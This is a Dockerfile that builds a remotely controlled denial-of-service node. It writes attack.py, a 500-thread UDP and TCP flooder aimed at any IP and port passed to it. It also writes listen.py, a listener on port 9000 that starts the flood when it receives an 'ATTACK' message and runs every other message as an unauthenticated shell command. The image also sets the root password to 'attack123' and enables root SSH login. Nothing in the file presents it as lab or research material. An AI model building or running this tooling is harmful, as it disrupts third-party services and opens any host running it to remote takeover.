FROM ubuntu:22.04

RUN apt update && apt install -y python3 openssh-server netcat-openbsd wget curl

RUN echo 'root:attack123' | chpasswd
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

RUN mkdir -p /app
WORKDIR /app

RUN printf 'import socket,threading,time,random,sys\n' > attack.py
RUN printf 'target_ip = sys.argv[1]\n' >> attack.py
RUN printf 'target_port = int(sys.argv[2])\n' >> attack.py
RUN printf 'THREADS = 500\n' >> attack.py
RUN printf 'DURATION = 300\n' >> attack.py
RUN printf 'stop_flag = False\n' >> attack.py
RUN printf 'pkt = [0]\n' >> attack.py
RUN printf 'payload = random._urandom(65507)\n' >> attack.py
RUN printf 'def udp():\n' >> attack.py
RUN printf '    while not stop_flag:\n' >> attack.py
RUN printf '        try:\n' >> attack.py
RUN printf '            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n' >> attack.py
RUN printf '            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)\n' >> attack.py
RUN printf '            for _ in range(100):\n' >> attack.py
RUN printf '                s.sendto(payload, (target_ip, target_port))\n' >> attack.py
RUN printf '                pkt[0] += 1\n' >> attack.py
RUN printf '            s.close()\n' >> attack.py
RUN printf '        except: pass\n' >> attack.py
RUN printf 'def tcp():\n' >> attack.py
RUN printf '    while not stop_flag:\n' >> attack.py
RUN printf '        try:\n' >> attack.py
RUN printf '            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n' >> attack.py
RUN printf '            s.settimeout(0.01)\n' >> attack.py
RUN printf '            s.connect_ex((target_ip, target_port))\n' >> attack.py
RUN printf '            s.send(b"\\x00"*65500)\n' >> attack.py
RUN printf '            pkt[0] += 1\n' >> attack.py
RUN printf '            s.close()\n' >> attack.py
RUN printf '        except: pass\n' >> attack.py
RUN printf 'for i in range(THREADS):\n' >> attack.py
RUN printf '    threading.Thread(target=udp if i%%2==0 else tcp, daemon=True).start()\n' >> attack.py
RUN printf 'start = time.time()\n' >> attack.py
RUN printf 'while time.time() - start < DURATION:\n' >> attack.py
RUN printf '    time.sleep(1)\n' >> attack.py
RUN printf '    print(pkt[0])\n' >> attack.py
RUN printf 'stop_flag = True\n' >> attack.py
RUN printf 'print("DONE:", pkt[0])\n' >> attack.py

RUN printf 'import socket,subprocess\n' > listen.py
RUN printf 's=socket.socket()\n' >> listen.py
RUN printf 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n' >> listen.py
RUN printf 's.bind(("0.0.0.0", 9000))\n' >> listen.py
RUN printf 's.listen(5)\n' >> listen.py
RUN printf 'print("[READY] VPS listening on port 9000")\n' >> listen.py
RUN printf 'while True:\n' >> listen.py
RUN printf '    try:\n' >> listen.py
RUN printf '        c,a=s.accept()\n' >> listen.py
RUN printf '        print("Connected:", a)\n' >> listen.py
RUN printf '        data=c.recv(1024).decode().strip()\n' >> listen.py
RUN printf '        if data.startswith("ATTACK"):\n' >> listen.py
RUN printf '            parts=data.split()\n' >> listen.py
RUN printf '            if len(parts)==3:\n' >> listen.py
RUN printf '                _,ip,port=parts\n' >> listen.py
RUN printf '                subprocess.Popen(["python3","/app/attack.py",ip,port])\n' >> listen.py
RUN printf '                c.send(b"ATTACK STARTED\\n")\n' >> listen.py
RUN printf '            else:\n' >> listen.py
RUN printf '                c.send(b"Usage: ATTACK <ip> <port>\\n")\n' >> listen.py
RUN printf '        else:\n' >> listen.py
RUN printf '            try:\n' >> listen.py
RUN printf '                out=subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT,timeout=10)\n' >> listen.py
RUN printf '                c.send(out)\n' >> listen.py
RUN printf '            except Exception as e:\n' >> listen.py
RUN printf '                c.send(str(e).encode())\n' >> listen.py
RUN printf '        c.close()\n' >> listen.py
RUN printf '    except Exception as e:\n' >> listen.py
RUN printf '        print("Error:", e)\n' >> listen.py

EXPOSE 9000
EXPOSE 22

CMD service ssh start && python3 /app/listen.py
